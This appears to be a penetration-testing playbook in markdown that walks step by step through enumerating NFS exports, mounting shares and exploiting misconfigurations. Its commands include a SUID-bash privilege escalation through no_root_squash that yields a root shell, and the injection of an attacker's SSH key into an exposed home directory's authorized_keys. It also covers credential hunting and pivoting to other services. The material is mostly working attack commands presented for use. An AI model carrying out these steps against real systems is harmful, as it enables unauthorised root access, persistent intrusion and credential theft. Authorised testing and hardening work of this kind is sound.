# NFS Enumeration & Exploitation

## Purpose

This file provides a structured workflow for enumerating NFS services and exploiting misconfigurations.

Core rules:

* NFS often exposes sensitive directories
* `no_root_squash` can lead directly to root access
* Always mount and inspect shares
* Writable shares are high value

---

## 0. Identify NFS

Common ports:

* 2049 (NFS)
* 111 (RPC / portmapper)

Confirm:

```bash id="t1n4x8"
nmap -p 111,2049 -sV <IP>
```

---

## 1. Enumerate Exports

```bash id="y8k3m2"
showmount -e <IP>
```

Output shows:

* exported directories
* access permissions

---

## 2. Mount Share

Create mount point:

```bash id="p2r7z6"
mkdir /mnt/nfs
```

Mount:

```bash id="c6v1q4"
mount -t nfs <IP>:/share /mnt/nfs
```

---

## 3. Explore Files

```bash id="w4j9x3"
cd /mnt/nfs
ls -la
```

Look for:

* user directories
* config files
* SSH keys
* scripts
* backups

---

## 4. Identify Permissions

Check:

* readable files
* writable files

```bash id="z7n5k1"
touch test.txt
```

If success:
→ writable share

---

## 5. Check for no_root_squash (CRITICAL)

If enabled:
→ root on your machine = root on target

Test:

1. Create root-owned file:

```bash id="m8v2x6"
sudo touch /mnt/nfs/root_test
```

2. Check ownership:

```bash id="q3c9t7"
ls -la /mnt/nfs
```

If owned by root:
→ `no_root_squash` likely enabled

---

## 6. Exploit no_root_squash

### Method: SUID Binary

On attacker machine:

```bash id="r1y6k8"
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash
```

On target:

```bash id="d5p8w3"
/mnt/nfs/bash -p
```

→ root shell

---

## 7. SSH Key Injection

If home directory exposed:

```bash id="h2z7n4"
mkdir -p /mnt/nfs/.ssh
echo "your_public_key" > /mnt/nfs/.ssh/authorized_keys
```

Then:

```bash id="k9x3q1"
ssh user@<IP>
```

---

## 8. Credential Discovery

Look for:

* config files
* scripts
* backups
* keys

---

## 9. Combine with Other Services

NFS findings → feed into:

* SSH
* SMB
* web apps

---

## 10. Pivot Opportunities

NFS can reveal:

* internal file structures
* user accounts
* credentials
* execution paths

---

## 11. If Mount Fails

Try:

* different export paths
* correct permissions
* different NFS versions

---

## 12. If Stuck

RESET:

* re-check exports
* re-check permissions
* test write again
* search for credentials

---

## 13. Mental Model

* NFS = file system access
* Write access = execution potential
* no_root_squash = root compromise

---

## 14. Golden Rules

* Always run showmount
* Always mount shares
* Always test write access
* Always check for no_root_squash
